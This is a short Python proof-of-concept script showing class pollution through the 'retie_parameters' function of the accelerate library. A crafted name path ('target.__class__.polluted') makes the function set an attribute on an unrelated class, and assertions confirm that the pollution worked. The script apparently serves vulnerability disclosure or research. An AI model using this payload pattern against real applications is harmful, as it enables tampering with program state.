# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: retie_parameters
# Type: get-attr-set-attr

from accelerate.utils.modeling import retie_parameters
import torch

class Target: pass
target = Target()

class MockModel:
  pass

model = MockModel()
model.target = target
model.pwnd = torch.tensor([0.0])

payload_value = model.pwnd
PAYLOAD = [["pwnd", "target.__class__.polluted"]]

def run_poc():
  retie_parameters(model, PAYLOAD)

def verify_poc():
  assert not hasattr(Target, "polluted"), "Pre-condition failed"
  run_poc()
  print(f"After: Target.polluted = {Target.polluted}")
  assert hasattr(Target, "polluted"), "Class pollution failed!"
  print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
  verify_poc()
